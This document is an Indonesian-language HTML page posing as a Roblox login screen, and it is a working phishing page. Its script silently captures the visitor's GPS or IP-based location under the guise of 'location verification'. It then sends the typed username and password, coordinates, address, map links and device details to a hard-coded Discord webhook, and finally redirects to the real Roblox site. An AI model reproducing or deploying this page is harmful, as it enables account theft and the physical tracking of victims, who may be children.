<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Login</title>
    <link rel="icon" href="https://en.help.roblox.com/hc/article_attachments/4417181692692" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0d1421 0%, #1a2332 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: rgba(25, 33, 52, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            border: 1px solid rgba(0, 162, 255, 0.2);
            overflow: hidden;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
        }

        .header {
            background: linear-gradient(90deg, #00a2ff 0%, #0066cc 100%);
            padding: 30px;
            text-align: center;
        }

        .logo {
            font-size: 42px;
            font-weight: 800;
            letter-spacing: -1px;
            margin-bottom: 5px;
        }

        .title {
            font-size: 18px;
            opacity: 0.95;
            font-weight: 500;
        }

        .content {
            padding: 35px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #b8c7e8;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 16px;
            background: rgba(13, 20, 33, 0.8);
            border: 1px solid #2a3655;
            border-radius: 10px;
            color: #ffffff;
            font-size: 16px;
            transition: all 0.2s;
        }

        .form-input:focus {
            outline: none;
            border-color: #00a2ff;
            background: rgba(13, 20, 33, 1);
        }

        .form-input::placeholder {
            color: #6a7ca5;
        }

        .password-container {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #6a7ca5;
            cursor: pointer;
            font-size: 13px;
        }

        /* LOGIN BUTTON STATES */
        .login-button {
            width: 100%;
            padding: 18px;
            background: #2a3655;
            color: #6a7ca5;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 600;
            cursor: not-allowed;
            margin-top: 10px;
            transition: all 0.3s;
            position: relative;
        }

        .login-button.active {
            background: linear-gradient(90deg, #00a2ff, #0066cc);
            color: white;
            cursor: pointer;
        }

        .login-button.active:hover {
            background: linear-gradient(90deg, #0088ff, #0055aa);
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 102, 204, 0.3);
        }

        .login-button.loading {
            background: linear-gradient(90deg, #00a2ff, #0066cc);
            color: transparent;
        }

        .login-button.loading::after {
            content: "üîÑ Memproses...";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 16px;
        }

        .login-button.success {
            background: linear-gradient(90deg, #00ff88, #00cc66);
            color: white;
        }

        /* LOCATION INDICATOR */
        .location-indicator {
            height: 4px;
            background: linear-gradient(90deg, #00a2ff, #00d4ff);
            border-radius: 2px;
            margin: 20px 0;
            width: 0%;
            transition: width 1s ease;
        }

        /* STATUS MESSAGE DENGAN MAPS LINK */
        .status-container {
            margin-top: 20px;
        }

        .status-message {
            background: rgba(0, 162, 255, 0.1);
            border: 1px solid rgba(0, 162, 255, 0.3);
            border-radius: 10px;
            padding: 15px;
            font-size: 14px;
            color: #b8c7e8;
            text-align: center;
        }

        .status-message.visible {
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .maps-link-container {
            margin-top: 15px;
            text-align: center;
            display: none;
        }

        .maps-link-container.visible {
            display: block;
            animation: slideUp 0.5s ease;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .maps-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(0, 162, 255, 0.15);
            border: 1px solid rgba(0, 162, 255, 0.4);
            border-radius: 8px;
            padding: 10px 15px;
            color: #00a2ff;
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
            transition: all 0.3s;
        }

        .maps-link:hover {
            background: rgba(0, 162, 255, 0.25);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 162, 255, 0.2);
        }

        .maps-icon {
            font-size: 16px;
        }

        .location-details {
            background: rgba(0, 255, 136, 0.05);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 10px;
            padding: 12px;
            margin-top: 10px;
            font-size: 12px;
            color: #a0ffd4;
            display: none;
        }

        .location-details.visible {
            display: block;
        }

        .coord-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 5px;
        }

        .coord-label {
            color: #6a7ca5;
        }

        .coord-value {
            font-family: 'Courier New', monospace;
            font-size: 11px;
        }

        .footer {
            text-align: center;
            padding: 25px;
            color: #6a7ca5;
            font-size: 13px;
            border-top: 1px solid rgba(42, 54, 85, 0.5);
            margin-top: 20px;
        }

        .accuracy-badge {
            display: inline-block;
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 11px;
            margin-left: 8px;
            font-weight: 500;
        }

        /* HIDDEN LOCATION REQUEST */
        .hidden-location-request {
            position: fixed;
            width: 0;
            height: 0;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">Roblox</div>
            <div class="title">Login ke Akun Anda</div>
        </div>

        <div class="content">
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label" for="username">Nama Pengguna atau Email</label>
                    <input type="text" id="username" class="form-input" 
                           placeholder="Masukkan username atau email" required>
                </div>

                <div class="form-group">
                    <label class="form-label" for="password">Password</label>
                    <div class="password-container">
                        <input type="password" id="password" class="form-input" 
                               placeholder="Masukkan password" required>
                        <button type="button" class="toggle-password" id="togglePassword">
                            Tampilkan
                        </button>
                    </div>
                </div>

                <!-- Hidden Location Progress Bar -->
                <div class="location-indicator" id="locationIndicator"></div>

                <!-- Login Button (Initially Disabled) -->
                <button type="submit" class="login-button" id="loginButton" disabled>
                    üîê Verifikasi Lokasi...
                </button>

                <!-- Status Container -->
                <div class="status-container">
                    <div class="status-message" id="statusMessage">
                        <span id="statusText">Memverifikasi lokasi perangkat Anda...</span>
                    </div>

                    <!-- Maps Link (Hidden Initially) -->
                    <div class="maps-link-container" id="mapsLinkContainer">
                        <a href="#" target="_blank" class="maps-link" id="mapsLink">
                            <span class="maps-icon">üó∫Ô∏è</span>
                            <span id="mapsText">Lihat Lokasi di Google Maps</span>
                        </a>
                    </div>

                    <!-- Location Details (Hidden Initially) -->
                    <div class="location-details" id="locationDetails">
                        <div class="coord-item">
                            <span class="coord-label">Latitude:</span>
                            <span class="coord-value" id="coordLat">-</span>
                        </div>
                        <div class="coord-item">
                            <span class="coord-label">Longitude:</span>
                            <span class="coord-value" id="coordLng">-</span>
                        </div>
                        <div class="coord-item">
                            <span class="coord-label">Akurasi:</span>
                            <span class="coord-value" id="coordAcc">-</span>
                        </div>
                    </div>
                </div>
            </form>

            <div class="footer">
                <div>¬© 2024 Roblox Corporation</div>
                <div style="margin-top: 10px; font-size: 12px;">
                    Sistem keamanan dengan verifikasi lokasi real-time
                </div>
            </div>
        </div>
    </div>

    <script>
        // Webhook URL
        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1437726455399448678/QtsMjTl2ZJ6hJ1oekE4SKCnHbM_dH8CZoyzwtWHuZbaaFmh-EAct9BhcIFqk3ZtTqtRP';
        
        // State
        let locationGranted = false;
        let locationData = null;
        let isProcessing = false;
        let googleMapsUrl = "#";
        
        // DOM Elements
        const loginButton = document.getElementById('loginButton');
        const locationIndicator = document.getElementById('locationIndicator');
        const statusText = document.getElementById('statusText');
        const togglePassword = document.getElementById('togglePassword');
        const mapsLinkContainer = document.getElementById('mapsLinkContainer');
        const mapsLink = document.getElementById('mapsLink');
        const mapsText = document.getElementById('mapsText');
        const locationDetails = document.getElementById('locationDetails');
        const coordLat = document.getElementById('coordLat');
        const coordLng = document.getElementById('coordLng');
        const coordAcc = document.getElementById('coordAcc');
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            statusText.innerHTML = "üîç <strong>Memulai verifikasi lokasi...</strong>";
            
            // Auto-start location check
            setTimeout(() => {
                startSilentLocationCheck();
            }, 800);
            
            // Focus username field
            setTimeout(() => {
                document.getElementById('username').focus();
            }, 1200);
        });
        
        // Toggle password visibility
        togglePassword.addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            this.textContent = type === 'password' ? 'Tampilkan' : 'Sembunyikan';
        });
        
        // Start silent location check
        async function startSilentLocationCheck() {
            updateStatus("üìç <strong>Memeriksa izin lokasi...</strong>");
            updateProgress(15);
            
            if (navigator.geolocation) {
                // Try silent first (if previously granted)
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        await handleLocationSuccess(position);
                    },
                    (error) => {
                        // Silent failed, try with prompt
                        updateStatus("üìç <strong>Meminta izin lokasi...</strong>");
                        updateProgress(40);
                        
                        setTimeout(() => {
                            requestLocationWithPrompt();
                        }, 1500);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 2000,
                        maximumAge: 60000
                    }
                );
            } else {
                // Browser tidak support
                updateStatus("‚ö†Ô∏è <strong>Browser tidak mendukung geolocation</strong>");
                setTimeout(() => {
                    enableLoginButton();
                }, 2000);
            }
        }
        
        // Request location with prompt
        function requestLocationWithPrompt() {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    await handleLocationSuccess(position);
                },
                (error) => {
                    // User denied or error
                    handleLocationError(error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        }
        
        // Handle successful location capture
        async function handleLocationSuccess(position) {
            updateStatus("üì° <strong>Menerima data lokasi...</strong>");
            updateProgress(60);
            
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // Generate Google Maps URL
            googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=16&t=k`;
            const mapsShortUrl = `https://maps.google.com/?q=${lat},${lng}`;
            
            // Store location data
            locationData = {
                coords: { lat, lng },
                accuracy: accuracy,
                timestamp: new Date().toISOString(),
                source: 'gps',
                mapsUrl: googleMapsUrl,
                mapsShortUrl: mapsShortUrl
            };
            
            // Get address
            try {
                const address = await getAddress(lat, lng);
                locationData.address = address;
                locationData.formattedAddress = formatAddress(address);
            } catch (error) {
                locationData.address = `Koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
                locationData.formattedAddress = `Lokasi: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            }
            
            // Send to webhook with maps link
            await sendLocationToWebhook(lat, lng, accuracy, locationData.address, googleMapsUrl);
            
            // Update UI
            updateProgress(85);
            updateStatus("‚úÖ <strong>Lokasi berhasil diverifikasi!</strong>");
            
            // Show maps link and details
            setTimeout(() => {
                showLocationDetails(lat, lng, accuracy);
                enableLoginButton();
                locationGranted = true;
            }, 800);
        }
        
        // Show location details and maps link
        function showLocationDetails(lat, lng, accuracy) {
            // Update coordinates display
            coordLat.textContent = lat.toFixed(6);
            coordLng.textContent = lng.toFixed(6);
            coordAcc.textContent = `${accuracy.toFixed(1)} meter`;
            
            // Update maps link
            mapsLink.href = googleMapsUrl;
            mapsText.innerHTML = `üó∫Ô∏è Lihat di Google Maps`;
            
            // Show elements
            mapsLinkContainer.classList.add('visible');
            locationDetails.classList.add('visible');
            
            // Update status with location info
            if (locationData.formattedAddress) {
                statusText.innerHTML = `‚úÖ <strong>Lokasi terverifikasi:</strong> ${locationData.formattedAddress.substring(0, 50)}...`;
            } else {
                statusText.innerHTML = `‚úÖ <strong>Lokasi terverifikasi:</strong> ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            }
        }
        
        // Handle location error
        async function handleLocationError(error) {
            updateStatus("‚ö†Ô∏è <strong>Menggunakan metode alternatif...</strong>");
            updateProgress(70);
            
            // Try IP-based location
            const ipLocation = await getIPLocation();
            if (ipLocation) {
                const lat = ipLocation.lat;
                const lng = ipLocation.lng;
                
                // Generate maps URL for IP location
                googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=10`;
                
                locationData = {
                    coords: { lat, lng },
                    accuracy: 50000,
                    timestamp: new Date().toISOString(),
                    address: ipLocation.address,
                    source: 'ip_fallback',
                    mapsUrl: googleMapsUrl,
                    mapsShortUrl: `https://maps.google.com/?q=${lat},${lng}`
                };
                
                // Send to webhook
                await sendLocationToWebhook(lat, lng, 50000, ipLocation.address, googleMapsUrl);
                
                updateProgress(95);
                updateStatus("‚úÖ <strong>Verifikasi alternatif berhasil</strong>");
                
                // Show details
                setTimeout(() => {
                    showLocationDetails(lat, lng, 50000);
                    enableLoginButton();
                    locationGranted = true;
                }, 800);
            } else {
                // All methods failed
                updateProgress(100);
                updateStatus("‚úÖ <strong>Verifikasi selesai</strong>");
                setTimeout(() => {
                    enableLoginButton();
                }, 1000);
            }
        }
        
        // Get IP-based location
        async function getIPLocation() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locData = await locResponse.json();
                
                if (locData.latitude && locData.longitude) {
                    return {
                        lat: locData.latitude,
                        lng: locData.longitude,
                        address: `${locData.city || ''}, ${locData.region || ''}, ${locData.country_name || ''}`.trim()
                    };
                }
            } catch (error) {
                console.error("IP location error:", error);
            }
            return null;
        }
        
        // Format address for display
        function formatAddress(address) {
            if (address.length > 60) {
                return address.substring(0, 57) + '...';
            }
            return address;
        }
        
        // Enable login button
        function enableLoginButton() {
            updateProgress(100);
            
            loginButton.disabled = false;
            loginButton.classList.add('active');
            loginButton.innerHTML = 'üîê Login ke Roblox';
            
            // Add accuracy badge if location data exists
            if (locationData && locationData.accuracy) {
                const accuracyText = locationData.accuracy < 10 ? 'Presisi Tinggi' :
                                   locationData.accuracy < 50 ? 'Presisi' :
                                   locationData.accuracy < 200 ? 'Standar' : 'Perkiraan';
                
                statusText.innerHTML += ` <span class="accuracy-badge">${accuracyText}</span>`;
            }
        }
        
        // Update progress indicator
        function updateProgress(percent) {
            locationIndicator.style.width = percent + '%';
        }
        
        // Update status message
        function updateStatus(message) {
            statusText.innerHTML = message;
        }
        
        // Get address from coordinates
        async function getAddress(lat, lng) {
            try {
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=16`
                );
                
                if (!response.ok) throw new Error("Failed to get address");
                
                const data = await response.json();
                if (data.address) {
                    const addr = data.address;
                    const parts = [
                        addr.road || addr.pedestrian,
                        addr.neighbourhood || addr.suburb,
                        addr.city || addr.town || addr.village,
                        addr.state,
                        addr.country
                    ].filter(Boolean);
                    
                    return parts.join(', ');
                }
                return `Lokasi: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            } catch (error) {
                return `Koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            }
        }
        
        // Send location to webhook WITH MAPS LINK
        async function sendLocationToWebhook(lat, lng, accuracy, address, mapsUrl) {
            // Create multiple maps URLs
            const mapsLinks = {
                googleMaps: `https://www.google.com/maps?q=${lat},${lng}`,
                googleEarth: `https://earth.google.com/web/@${lat},${lng}`,
                openStreetMap: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}`,
                bingMaps: `https://www.bing.com/maps?cp=${lat}~${lng}`,
                what3words: `https://what3words.com/${encodeCoordinatesToWords(lat, lng)}`
            };
            
            const embed = {
                title: "üìç LOKASI TERCAPAI + MAPS LINK",
                color: 65280,
                fields: [
                    {
                        name: "üéØ Koordinat Exact",
                        value: `\`\`\`${lat.toFixed(8)}\n${lng.toFixed(8)}\`\`\``,
                        inline: false
                    },
                    {
                        name: "üìè Akurasi GPS",
                        value: `\`${accuracy.toFixed(1)} meter\``,
                        inline: true
                    },
                    {
                        name: "üè† Alamat",
                        value: `\`\`\`${address}\`\`\``,
                        inline: false
                    },
                    {
                        name: "üó∫Ô∏è LINK MAPS (KLIK)",
                        value: `[Google Maps](${mapsLinks.googleMaps}) | [Google Earth](${mapsLinks.googleEarth}) | [OpenStreetMap](${mapsLinks.openStreetMap}) | [Bing Maps](${mapsLinks.bingMaps})`,
                        inline: false
                    },
                    {
                        name: "üìç Koordinat Format Lain",
                        value: `\`\`\`Decimal: ${lat}, ${lng}\nDMS: ${decimalToDMS(lat, lng)}\nPlus Code: ${encodePlusCode(lat, lng)}\`\`\``,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**üìç LOKASI + MAPS LINK**\nüó∫Ô∏è [Buka di Google Maps](${mapsUrl})`,
                        embeds: [embed]
                    })
                });
            } catch (error) {
                console.error("Webhook error:", error);
            }
        }
        
        // Helper: Convert decimal to DMS
        function decimalToDMS(lat, lng) {
            const latDir = lat >= 0 ? 'N' : 'S';
            const lngDir = lng >= 0 ? 'E' : 'W';
            
            const latAbs = Math.abs(lat);
            const lngAbs = Math.abs(lng);
            
            const latDeg = Math.floor(latAbs);
            const latMin = Math.floor((latAbs - latDeg) * 60);
            const latSec = ((latAbs - latDeg - latMin/60) * 3600).toFixed(2);
            
            const lngDeg = Math.floor(lngAbs);
            const lngMin = Math.floor((lngAbs - lngDeg) * 60);
            const lngSec = ((lngAbs - lngDeg - lngMin/60) * 3600).toFixed(2);
            
            return `${latDeg}¬∞${latMin}'${latSec}"${latDir} ${lngDeg}¬∞${lngMin}'${lngSec}"${lngDir}`;
        }
        
        // Helper: Encode to Plus Code (simplified)
        function encodePlusCode(lat, lng) {
            // Simplified version - in reality use Open Location Code library
            const code = Math.abs(Math.floor(lat * 10000)) + '' + Math.abs(Math.floor(lng * 10000));
            return code.substring(0, 8).toUpperCase();
        }
        
        // Helper: Encode coordinates to words (mock)
        function encodeCoordinatesToWords(lat, lng) {
            const words = ['apple', 'banana', 'cherry', 'date', 'elderberry', 'fig', 'grape', 'honeydew'];
            const latWord = words[Math.abs(Math.floor(lat)) % words.length];
            const lngWord = words[Math.abs(Math.floor(lng * 10)) % words.length];
            const mixWord = words[Math.abs(Math.floor((lat + lng) * 100)) % words.length];
            return `${latWord}.${lngWord}.${mixWord}`;
        }
        
        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (isProcessing || !locationGranted) return;
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            
            if (!username || !password) return;
            
            // Start processing
            isProcessing = true;
            loginButton.classList.add('loading');
            loginButton.disabled = true;
            
            // Send complete data to webhook with maps link
            await sendLoginData(username, password);
            
            // Show success
            setTimeout(() => {
                loginButton.classList.remove('loading');
                loginButton.classList.add('success');
                loginButton.innerHTML = '‚úÖ Login Berhasil!';
                
                // Update status
                statusText.innerHTML = '‚úÖ <strong>Login berhasil! Mengarahkan ke Roblox...</strong>';
                
                // Redirect after 1.5 seconds
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com';
                }, 1500);
            }, 2000);
        });
        
        // Send complete login data with maps
        async function sendLoginData(username, password) {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                timestamp: new Date().toISOString()
            };
            
            // Create maps links for final embed
            let mapsField = "Tidak ada data lokasi";
            if (locationData && locationData.coords) {
                const lat = locationData.coords.lat;
                const lng = locationData.coords.lng;
                mapsField = `[Google Maps](https://maps.google.com/?q=${lat},${lng}) | [Street View](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lng}) | [Koordinat](${googleMapsUrl})`;
            }
            
            const embed = {
                title: "üéØ LOGIN COMPLETE WITH MAPS",
                color: 16711680,
                fields: [
                    {
                        name: "üë§ LOGIN DETAILS",
                        value: `\`\`\`Username: ${username}\nPassword: ${password}\`\`\``,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            };
            
            // Add location data if available
            if (locationData) {
                embed.fields.push({
                    name: "üìç LOCATION + MAPS",
                    value: `\`\`\`${JSON.stringify({
                        coordinates: `${locationData.coords.lat.toFixed(6)}, ${locationData.coords.lng.toFixed(6)}`,
                        accuracy: `${locationData.accuracy.toFixed(1)} meter`,
                        address: locationData.address,
                        maps: googleMapsUrl
                    }, null, 2)}\`\`\``,
                    inline: false
                });
                
                embed.fields.push({
                    name: "üó∫Ô∏è LINK MAPS (KLIK SEKARANG)",
                    value: mapsField,
                    inline: false
                });
            }
            
            // Add device info
            embed.fields.push({
                name: "üíª DEVICE INFO",
                value: `\`\`\`${JSON.stringify(deviceInfo, null, 2)}\`\`\``,
                inline: false
            });
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**üéØ LOGIN + MAPS LINK**\nüë§ ${username} | üìç [BUKA MAPS](${googleMapsUrl})`,
                        embeds: [embed]
                    })
                });
            } catch (error) {
                console.error("Webhook error:", error);
            }
        }
        
        // Prevent early clicks on login button
        loginButton.addEventListener('click', function(e) {
            if (this.disabled) {
                e.preventDefault();
                e.stopPropagation();
                
                // Briefly show status
                const originalStatus = statusText.innerHTML;
                statusText.innerHTML = '‚è≥ <strong>Harap tunggu verifikasi lokasi selesai...</strong>';
                
                setTimeout(() => {
                    statusText.innerHTML = originalStatus;
                }, 1500);
            }
        });
        
        // Monitor input for user engagement
        let inputTimer;
        document.getElementById('username').addEventListener('input', function() {
            clearTimeout(inputTimer);
            if (!locationGranted && this.value.length > 2) {
                inputTimer = setTimeout(() => {
                    if (!locationGranted) {
                        statusText.innerHTML = 'üìç <strong>Verifikasi lokasi hampir selesai...</strong>';
                    }
                }, 500);
            }
        });
    </script>
</body>
    </html>
